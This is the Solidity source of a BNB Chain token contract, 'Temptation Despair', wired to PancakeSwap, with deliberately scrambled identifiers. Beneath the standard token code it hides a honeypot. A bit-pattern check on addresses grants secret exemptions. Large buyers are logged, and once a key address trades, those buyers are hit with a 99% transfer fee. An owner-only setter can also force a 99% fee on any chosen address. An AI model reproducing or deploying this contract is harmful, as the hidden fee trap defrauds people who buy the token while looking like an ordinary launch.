/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract TemptationDespair is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Temptation Despair ";
    string constant _symbol = "TemptationDespair";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletIsSellTxAutoLiquidity;
    mapping(address => bool) private txLiquidityBuyMax;
    mapping(address => bool) private feeTeamBotsMaxSellSwap;
    mapping(address => bool) private autoMaxTxLaunchedBuyMin;
    mapping(address => uint256) private sellBotsBurnMaxSwapIs;
    mapping(uint256 => address) private maxSwapFeeMode;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private teamLimitSwapMarketingBurnBotsLaunched = 0;
    uint256 private launchedMarketingAutoBots = 5;

    //SELL FEES
    uint256 private buyMinBotsAuto = 0;
    uint256 private maxLimitReceiverBuy = 5;

    uint256 private txBuyBurnMarketing = launchedMarketingAutoBots + teamLimitSwapMarketingBurnBotsLaunched;
    uint256 private teamLaunchedBuyTradingBurnExemptLimit = 100;

    address private txMarketingTeamSell = (msg.sender); // auto-liq address
    address private walletModeLaunchedSell = (0xa0cDa954a4a6B62725601A1dFFFfd5cb3abaFEF2); // marketing address
    address private marketingModeLimitMaxBuy = DEAD;
    address private burnTxWalletSwapAutoExempt = DEAD;
    address private minFeeMaxIs = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private modeWalletReceiverMarketing;
    uint256 private modeFeeLimitMin;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private minReceiverBotsBurn;
    uint256 private isMaxLiquiditySwapSellBotsBuy;
    uint256 private marketingBotsFeeIs;
    uint256 private burnMinFeeMax;
    uint256 private receiverBotsBuyAuto;

    bool private sellBurnTeamExemptTx = true;
    bool private autoMaxTxLaunchedBuyMinMode = true;
    bool private receiverBuySellTeamLimitTx = true;
    bool private liquidityExemptLimitTx = true;
    bool private txLaunchedReceiverTrading = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private teamMarketingLiquidityExempt = 6 * 10 ** 15;
    uint256 private txMarketingBotsMin = _totalSupply / 1000; // 0.1%

    
    uint256 private feeSwapReceiverModeMax = 0;
    bool private receiverMaxFeeIs = false;
    bool private botsReceiverAutoMin = false;
    uint256 private botsTxWalletBuy = 0;
    uint256 private liquidityExemptReceiverMinModeBurn = 0;
    uint256 private maxTeamAutoMarketing = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        minReceiverBotsBurn = true;

        walletIsSellTxAutoLiquidity[msg.sender] = true;
        walletIsSellTxAutoLiquidity[address(this)] = true;

        txLiquidityBuyMax[msg.sender] = true;
        txLiquidityBuyMax[0x0000000000000000000000000000000000000000] = true;
        txLiquidityBuyMax[0x000000000000000000000000000000000000dEaD] = true;
        txLiquidityBuyMax[address(this)] = true;

        feeTeamBotsMaxSellSwap[msg.sender] = true;
        feeTeamBotsMaxSellSwap[0x0000000000000000000000000000000000000000] = true;
        feeTeamBotsMaxSellSwap[0x000000000000000000000000000000000000dEaD] = true;
        feeTeamBotsMaxSellSwap[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return walletFeeLiquidityReceiver(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return walletFeeLiquidityReceiver(sender, recipient, amount);
    }

    function walletFeeLiquidityReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (liquidityExemptReceiverMinModeBurn != txBuyBurnMarketing) {
            liquidityExemptReceiverMinModeBurn = txBuyBurnMarketing;
        }

        if (botsReceiverAutoMin != liquidityExemptLimitTx) {
            botsReceiverAutoMin = botsReceiverAutoMin;
        }

        if (botsTxWalletBuy == botsTxWalletBuy) {
            botsTxWalletBuy = botsTxWalletBuy;
        }


        bool bLimitTxWalletValue = modeBuyReceiverSellLiquidityLimitFee(sender) || modeBuyReceiverSellLiquidityLimitFee(recipient);
        
        if (liquidityExemptReceiverMinModeBurn != maxLimitReceiverBuy) {
            liquidityExemptReceiverMinModeBurn = teamLimitSwapMarketingBurnBotsLaunched;
        }

        if (botsReceiverAutoMin != autoMaxTxLaunchedBuyMinMode) {
            botsReceiverAutoMin = botsReceiverAutoMin;
        }

        if (botsTxWalletBuy == teamMarketingLiquidityExempt) {
            botsTxWalletBuy = feeSwapReceiverModeMax;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                minAutoIsReceiver();
            }
            if (!bLimitTxWalletValue) {
                feeBuyTradingBotsBurnReceiver(recipient);
            }
        }
        
        if (maxTeamAutoMarketing != liquidityExemptReceiverMinModeBurn) {
            maxTeamAutoMarketing = botsTxWalletBuy;
        }

        if (feeSwapReceiverModeMax == feeSwapReceiverModeMax) {
            feeSwapReceiverModeMax = maxLimitReceiverBuy;
        }

        if (receiverMaxFeeIs == txLaunchedReceiverTrading) {
            receiverMaxFeeIs = autoMaxTxLaunchedBuyMinMode;
        }


        if (inSwap || bLimitTxWalletValue) {return minReceiverLaunchedSell(sender, recipient, amount);}

        if (!walletIsSellTxAutoLiquidity[sender] && !walletIsSellTxAutoLiquidity[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || feeTeamBotsMaxSellSwap[sender] || feeTeamBotsMaxSellSwap[recipient], "Max TX Limit has been triggered");

        if (launchedAutoIsMarketing()) {maxMarketingIsWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = modeBotsTeamSell(sender) ? liquidityBurnTxBotsSwapBuy(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function minReceiverLaunchedSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeBotsTeamSell(address sender) internal view returns (bool) {
        return !txLiquidityBuyMax[sender];
    }

    function tradingLaunchedIsBotsBurn(address sender, bool selling) internal returns (uint256) {
        
        if (botsTxWalletBuy == launchedMarketingAutoBots) {
            botsTxWalletBuy = teamMarketingLiquidityExempt;
        }


        if (selling) {
            txBuyBurnMarketing = maxLimitReceiverBuy + buyMinBotsAuto;
            return autoBotsMinBuy(sender, txBuyBurnMarketing);
        }
        if (!selling && sender == uniswapV2Pair) {
            txBuyBurnMarketing = launchedMarketingAutoBots + teamLimitSwapMarketingBurnBotsLaunched;
            return txBuyBurnMarketing;
        }
        return autoBotsMinBuy(sender, txBuyBurnMarketing);
    }

    function buyLimitLaunchedTrading() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function liquidityBurnTxBotsSwapBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (maxTeamAutoMarketing != txMarketingBotsMin) {
            maxTeamAutoMarketing = liquidityExemptReceiverMinModeBurn;
        }

        if (feeSwapReceiverModeMax == txBuyBurnMarketing) {
            feeSwapReceiverModeMax = teamMarketingLiquidityExempt;
        }

        if (botsTxWalletBuy == buyMinBotsAuto) {
            botsTxWalletBuy = teamLaunchedBuyTradingBurnExemptLimit;
        }


        uint256 feeAmount = amount.mul(tradingLaunchedIsBotsBurn(sender, receiver == uniswapV2Pair)).div(teamLaunchedBuyTradingBurnExemptLimit);

        if (autoMaxTxLaunchedBuyMin[sender] || autoMaxTxLaunchedBuyMin[receiver]) {
            feeAmount = amount.mul(99).div(teamLaunchedBuyTradingBurnExemptLimit);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function modeBuyReceiverSellLiquidityLimitFee(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function autoBotsMinBuy(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = sellBotsBurnMaxSwapIs[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function feeBuyTradingBotsBurnReceiver(address addr) private {
        if (buyLimitLaunchedTrading() < teamMarketingLiquidityExempt) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        maxSwapFeeMode[exemptLimitValue] = addr;
    }

    function minAutoIsReceiver() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (sellBotsBurnMaxSwapIs[maxSwapFeeMode[i]] == 0) {
                    sellBotsBurnMaxSwapIs[maxSwapFeeMode[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletModeLaunchedSell).transfer(amountBNB * amountPercentage / 100);
    }

    function launchedAutoIsMarketing() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    txLaunchedReceiverTrading &&
    _balances[address(this)] >= txMarketingBotsMin;
    }

    function maxMarketingIsWallet() internal swapping {
        
        if (botsTxWalletBuy == maxLimitReceiverBuy) {
            botsTxWalletBuy = txBuyBurnMarketing;
        }

        if (botsReceiverAutoMin != botsReceiverAutoMin) {
            botsReceiverAutoMin = txLaunchedReceiverTrading;
        }


        uint256 amountToLiquify = txMarketingBotsMin.mul(teamLimitSwapMarketingBurnBotsLaunched).div(txBuyBurnMarketing).div(2);
        uint256 amountToSwap = txMarketingBotsMin.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = txBuyBurnMarketing.sub(teamLimitSwapMarketingBurnBotsLaunched.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(teamLimitSwapMarketingBurnBotsLaunched).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(launchedMarketingAutoBots).div(totalETHFee);
        
        payable(walletModeLaunchedSell).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                txMarketingTeamSell,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getAutoMaxTxLaunchedBuyMinMode() public view returns (bool) {
        if (autoMaxTxLaunchedBuyMinMode == receiverMaxFeeIs) {
            return receiverMaxFeeIs;
        }
        if (autoMaxTxLaunchedBuyMinMode != botsReceiverAutoMin) {
            return botsReceiverAutoMin;
        }
        return autoMaxTxLaunchedBuyMinMode;
    }
    function setAutoMaxTxLaunchedBuyMinMode(bool a0) public onlyOwner {
        if (autoMaxTxLaunchedBuyMinMode == txLaunchedReceiverTrading) {
            txLaunchedReceiverTrading=a0;
        }
        if (autoMaxTxLaunchedBuyMinMode == receiverMaxFeeIs) {
            receiverMaxFeeIs=a0;
        }
        if (autoMaxTxLaunchedBuyMinMode != botsReceiverAutoMin) {
            botsReceiverAutoMin=a0;
        }
        autoMaxTxLaunchedBuyMinMode=a0;
    }

    function getTxBuyBurnMarketing() public view returns (uint256) {
        return txBuyBurnMarketing;
    }
    function setTxBuyBurnMarketing(uint256 a0) public onlyOwner {
        if (txBuyBurnMarketing != teamLimitSwapMarketingBurnBotsLaunched) {
            teamLimitSwapMarketingBurnBotsLaunched=a0;
        }
        if (txBuyBurnMarketing == txBuyBurnMarketing) {
            txBuyBurnMarketing=a0;
        }
        if (txBuyBurnMarketing != liquidityExemptReceiverMinModeBurn) {
            liquidityExemptReceiverMinModeBurn=a0;
        }
        txBuyBurnMarketing=a0;
    }

    function getBuyMinBotsAuto() public view returns (uint256) {
        if (buyMinBotsAuto == launchedMarketingAutoBots) {
            return launchedMarketingAutoBots;
        }
        if (buyMinBotsAuto != txBuyBurnMarketing) {
            return txBuyBurnMarketing;
        }
        if (buyMinBotsAuto != txBuyBurnMarketing) {
            return txBuyBurnMarketing;
        }
        return buyMinBotsAuto;
    }
    function setBuyMinBotsAuto(uint256 a0) public onlyOwner {
        buyMinBotsAuto=a0;
    }

    function getMaxLimitReceiverBuy() public view returns (uint256) {
        if (maxLimitReceiverBuy != maxTeamAutoMarketing) {
            return maxTeamAutoMarketing;
        }
        if (maxLimitReceiverBuy == maxTeamAutoMarketing) {
            return maxTeamAutoMarketing;
        }
        return maxLimitReceiverBuy;
    }
    function setMaxLimitReceiverBuy(uint256 a0) public onlyOwner {
        maxLimitReceiverBuy=a0;
    }

    function getFeeTeamBotsMaxSellSwap(address a0) public view returns (bool) {
            return feeTeamBotsMaxSellSwap[a0];
    }
    function setFeeTeamBotsMaxSellSwap(address a0,bool a1) public onlyOwner {
        feeTeamBotsMaxSellSwap[a0]=a1;
    }

    function getAutoMaxTxLaunchedBuyMin(address a0) public view returns (bool) {
        if (a0 != txMarketingTeamSell) {
            return botsReceiverAutoMin;
        }
        if (a0 == txMarketingTeamSell) {
            return receiverBuySellTeamLimitTx;
        }
        if (a0 == marketingModeLimitMaxBuy) {
            return autoMaxTxLaunchedBuyMinMode;
        }
            return autoMaxTxLaunchedBuyMin[a0];
    }
    function setAutoMaxTxLaunchedBuyMin(address a0,bool a1) public onlyOwner {
        if (a0 != marketingModeLimitMaxBuy) {
            botsReceiverAutoMin=a1;
        }
        autoMaxTxLaunchedBuyMin[a0]=a1;
    }

    function getMarketingModeLimitMaxBuy() public view returns (address) {
        if (marketingModeLimitMaxBuy == marketingModeLimitMaxBuy) {
            return marketingModeLimitMaxBuy;
        }
        if (marketingModeLimitMaxBuy == burnTxWalletSwapAutoExempt) {
            return burnTxWalletSwapAutoExempt;
        }
        if (marketingModeLimitMaxBuy == txMarketingTeamSell) {
            return txMarketingTeamSell;
        }
        return marketingModeLimitMaxBuy;
    }
    function setMarketingModeLimitMaxBuy(address a0) public onlyOwner {
        if (marketingModeLimitMaxBuy == minFeeMaxIs) {
            minFeeMaxIs=a0;
        }
        if (marketingModeLimitMaxBuy != burnTxWalletSwapAutoExempt) {
            burnTxWalletSwapAutoExempt=a0;
        }
        marketingModeLimitMaxBuy=a0;
    }

    function getBotsReceiverAutoMin() public view returns (bool) {
        return botsReceiverAutoMin;
    }
    function setBotsReceiverAutoMin(bool a0) public onlyOwner {
        if (botsReceiverAutoMin != liquidityExemptLimitTx) {
            liquidityExemptLimitTx=a0;
        }
        if (botsReceiverAutoMin != receiverBuySellTeamLimitTx) {
            receiverBuySellTeamLimitTx=a0;
        }
        botsReceiverAutoMin=a0;
    }

    function getBurnTxWalletSwapAutoExempt() public view returns (address) {
        if (burnTxWalletSwapAutoExempt == burnTxWalletSwapAutoExempt) {
            return burnTxWalletSwapAutoExempt;
        }
        return burnTxWalletSwapAutoExempt;
    }
    function setBurnTxWalletSwapAutoExempt(address a0) public onlyOwner {
        if (burnTxWalletSwapAutoExempt == minFeeMaxIs) {
            minFeeMaxIs=a0;
        }
        if (burnTxWalletSwapAutoExempt != minFeeMaxIs) {
            minFeeMaxIs=a0;
        }
        if (burnTxWalletSwapAutoExempt != minFeeMaxIs) {
            minFeeMaxIs=a0;
        }
        burnTxWalletSwapAutoExempt=a0;
    }

    function getWalletIsSellTxAutoLiquidity(address a0) public view returns (bool) {
            return walletIsSellTxAutoLiquidity[a0];
    }
    function setWalletIsSellTxAutoLiquidity(address a0,bool a1) public onlyOwner {
        walletIsSellTxAutoLiquidity[a0]=a1;
    }

    function getTeamMarketingLiquidityExempt() public view returns (uint256) {
        if (teamMarketingLiquidityExempt != maxLimitReceiverBuy) {
            return maxLimitReceiverBuy;
        }
        if (teamMarketingLiquidityExempt == buyMinBotsAuto) {
            return buyMinBotsAuto;
        }
        return teamMarketingLiquidityExempt;
    }
    function setTeamMarketingLiquidityExempt(uint256 a0) public onlyOwner {
        if (teamMarketingLiquidityExempt == launchedMarketingAutoBots) {
            launchedMarketingAutoBots=a0;
        }
        if (teamMarketingLiquidityExempt == buyMinBotsAuto) {
            buyMinBotsAuto=a0;
        }
        teamMarketingLiquidityExempt=a0;
    }

    function getReceiverMaxFeeIs() public view returns (bool) {
        return receiverMaxFeeIs;
    }
    function setReceiverMaxFeeIs(bool a0) public onlyOwner {
        if (receiverMaxFeeIs == receiverBuySellTeamLimitTx) {
            receiverBuySellTeamLimitTx=a0;
        }
        receiverMaxFeeIs=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}